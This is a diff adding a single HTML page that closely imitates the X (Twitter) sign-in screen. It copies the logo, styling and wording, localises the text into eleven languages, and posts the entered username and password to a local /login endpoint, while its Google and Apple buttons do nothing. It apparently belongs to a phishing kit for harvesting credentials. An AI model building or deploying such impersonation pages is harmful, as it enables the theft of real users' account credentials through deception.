@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>X - Sign in</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e7e9ea}
+.card{background:#000;border:1px solid #2f3336;border-radius:16px;padding:32px;
+width:100%;max-width:440px}
+.logo{text-align:center;margin-bottom:24px;font-size:2rem;font-weight:800}
+.logo svg{width:32px;height:32px;fill:#fff}
+h1{font-size:1.8rem;font-weight:700;margin-bottom:28px;text-align:center}
+.oauth{width:100%;padding:10px;border:1px solid #536471;border-radius:20px;
+background:transparent;color:#e7e9ea;font-size:15px;font-weight:500;cursor:pointer;
+margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:8px}
+.oauth:hover{background:rgba(255,255,255,.05)}
+.sep{display:flex;align-items:center;margin:12px 0;gap:12px}
+.sep .line{flex:1;height:1px;background:#2f3336}
+.sep span{color:#71767b;font-size:15px}
+input{width:100%;padding:16px;background:#000;border:1px solid #333639;
+border-radius:4px;color:#e7e9ea;font-size:17px;margin-bottom:12px;outline:none}
+input:focus{border-color:#1d9bf0;box-shadow:0 0 0 1px #1d9bf0}
+input::placeholder{color:#71767b}
+.btn{width:100%;padding:14px;background:#e7e9ea;color:#0f1419;border:none;
+border-radius:20px;font-size:15px;font-weight:700;cursor:pointer;margin-top:16px}
+.btn:hover{background:#d7d9db}
+.forgot{text-align:center;margin-top:16px}
+.forgot a{color:#1d9bf0;text-decoration:none;font-size:14px}
+.signup{text-align:center;margin-top:20px;color:#71767b;font-size:15px}
+.signup a{color:#1d9bf0;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo"><svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></div>
+<h1 data-i18n="title">Sign in to X</h1>
+<button class="oauth" type="button">G &nbsp; <span data-i18n="google">Sign in with Google</span></button>
+<button class="oauth" type="button">&apple; &nbsp; <span data-i18n="apple">Sign in with Apple</span></button>
+<div class="sep"><div class="line"></div><span data-i18n="or">or</span><div class="line"></div></div>
+<form method="POST" action="/login">
+<input type="text" name="username" data-i18n-ph="user_ph" placeholder="Phone, email or username" required autocomplete="off">
+<input type="password" name="password" data-i18n-ph="pass_ph" placeholder="Password" required>
+<button type="submit" class="btn" data-i18n="next">Next</button>
+</form>
+<div class="forgot"><a href="#" data-i18n="forgot">Forgot password?</a></div>
+<div class="signup"><span data-i18n="no_account">Don't have an account?</span> <a href="#" data-i18n="signup">Sign up</a></div>
+</div>
+<script>
+(function(){
+var T={
+en:{title:"Sign in to X",google:"Sign in with Google",apple:"Sign in with Apple",or:"or",user_ph:"Phone, email or username",pass_ph:"Password",next:"Next",forgot:"Forgot password?",no_account:"Don't have an account?",signup:"Sign up"},
+pt:{title:"Entrar no X",google:"Entrar com o Google",apple:"Entrar com a Apple",or:"ou",user_ph:"Telefone, email ou nome de usu\u00e1rio",pass_ph:"Senha",next:"Avan\u00e7ar",forgot:"Esqueceu a senha?",no_account:"N\u00e3o tem uma conta?",signup:"Inscreva-se"},
+es:{title:"Iniciar sesi\u00f3n en X",google:"Iniciar sesi\u00f3n con Google",apple:"Iniciar sesi\u00f3n con Apple",or:"o",user_ph:"Tel\u00e9fono, email o usuario",pass_ph:"Contrase\u00f1a",next:"Siguiente",forgot:"\u00bfOlvidaste tu contrase\u00f1a?",no_account:"\u00bfNo tienes una cuenta?",signup:"Reg\u00edstrate"},
+fr:{title:"Se connecter \u00e0 X",google:"Se connecter avec Google",apple:"Se connecter avec Apple",or:"ou",user_ph:"T\u00e9l., e-mail ou nom d'utilisateur",pass_ph:"Mot de passe",next:"Suivant",forgot:"Mot de passe oubli\u00e9 ?",no_account:"Vous n'avez pas de compte ?",signup:"Inscrivez-vous"},
+de:{title:"Bei X anmelden",google:"Mit Google anmelden",apple:"Mit Apple anmelden",or:"oder",user_ph:"Telefon, E-Mail oder Benutzername",pass_ph:"Passwort",next:"Weiter",forgot:"Passwort vergessen?",no_account:"Noch kein Konto?",signup:"Registrieren"},
+it:{title:"Accedi a X",google:"Accedi con Google",apple:"Accedi con Apple",or:"oppure",user_ph:"Telefono, email o nome utente",pass_ph:"Password",next:"Avanti",forgot:"Password dimenticata?",no_account:"Non hai un account?",signup:"Iscriviti"},
+ja:{title:"X\u306b\u30ed\u30b0\u30a4\u30f3",google:"Google\u3067\u30ed\u30b0\u30a4\u30f3",apple:"Apple\u3067\u30ed\u30b0\u30a4\u30f3",or:"\u307e\u305f\u306f",user_ph:"\u96fb\u8a71\u756a\u53f7\u3001\u30e1\u30fc\u30eb\u307e\u305f\u306f\u30e6\u30fc\u30b6\u30fc\u540d",pass_ph:"\u30d1\u30b9\u30ef\u30fc\u30c9",next:"\u6b21\u3078",forgot:"\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u5fd8\u308c\u305f\u5834\u5408",no_account:"\u30a2\u30ab\u30a6\u30f3\u30c8\u304c\u306a\u3044\u5834\u5408\u306f",signup:"\u767b\u9332"},
+zh:{title:"\u767b\u5f55 X",google:"\u4f7f\u7528 Google \u767b\u5f55",apple:"\u4f7f\u7528 Apple \u767b\u5f55",or:"\u6216",user_ph:"\u624b\u673a\u53f7\u3001\u90ae\u7bb1\u6216\u7528\u6237\u540d",pass_ph:"\u5bc6\u7801",next:"\u4e0b\u4e00\u6b65",forgot:"\u5fd8\u8bb0\u5bc6\u7801\uff1f",no_account:"\u6ca1\u6709\u8d26\u6237\uff1f",signup:"\u6ce8\u518c"},
+ko:{title:"X\uc5d0 \ub85c\uadf8\uc778",google:"Google\ub85c \ub85c\uadf8\uc778",apple:"Apple\ub85c \ub85c\uadf8\uc778",or:"\ub610\ub294",user_ph:"\uc804\ud654\ubc88\ud638, \uc774\uba54\uc77c \ub610\ub294 \uc0ac\uc6a9\uc790 \uc774\ub984",pass_ph:"\ube44\ubc00\ubc88\ud638",next:"\ub2e4\uc74c",forgot:"\ube44\ubc00\ubc88\ud638\ub97c \uc78a\uc73c\uc168\ub098\uc694?",no_account:"\uacc4\uc815\uc774 \uc5c6\uc73c\uc2e0\uac00\uc694?",signup:"\uac00\uc785\ud558\uae30"},
+ru:{title:"\u0412\u043e\u0439\u0442\u0438 \u0432 X",google:"\u0412\u043e\u0439\u0442\u0438 \u0447\u0435\u0440\u0435\u0437 Google",apple:"\u0412\u043e\u0439\u0442\u0438 \u0447\u0435\u0440\u0435\u0437 Apple",or:"\u0438\u043b\u0438",user_ph:"\u0422\u0435\u043b\u0435\u0444\u043e\u043d, email \u0438\u043b\u0438 \u0438\u043c\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f",pass_ph:"\u041f\u0430\u0440\u043e\u043b\u044c",next:"\u0414\u0430\u043b\u0435\u0435",forgot:"\u0417\u0430\u0431\u044b\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c?",no_account:"\u041d\u0435\u0442 \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0430?",signup:"\u0417\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u0443\u0439\u0442\u0435\u0441\u044c"},
+ar:{title:"\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644 \u0625\u0644\u0649 X",google:"\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644 \u0628\u0648\u0627\u0633\u0637\u0629 Google",apple:"\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644 \u0628\u0648\u0627\u0633\u0637\u0629 Apple",or:"\u0623\u0648",user_ph:"\u0627\u0644\u0647\u0627\u062a\u0641 \u0623\u0648 \u0627\u0644\u0628\u0631\u064a\u062f \u0623\u0648 \u0627\u0633\u0645 \u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645",pass_ph:"\u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631",next:"\u0627\u0644\u062a\u0627\u0644\u064a",forgot:"\u0646\u0633\u064a\u062a \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631\u061f",no_account:"\u0644\u064a\u0633 \u0644\u062f\u064a\u0643 \u062d\u0633\u0627\u0628\u061f",signup:"\u0633\u062c\u0651\u0644"}
+};
+var l=(navigator.language||navigator.userLanguage||'en').split('-')[0];var t=T[l]||T['en'];
+document.querySelectorAll('[data-i18n]').forEach(function(e){var k=e.getAttribute('data-i18n');if(t[k])e.textContent=t[k]});
+document.querySelectorAll('[data-i18n-ph]').forEach(function(e){var k=e.getAttribute('data-i18n-ph');if(t[k])e.placeholder=t[k]});
+if(l==='ar'){document.documentElement.dir='rtl'}
+})();
+</script>
+</body>
+</html>
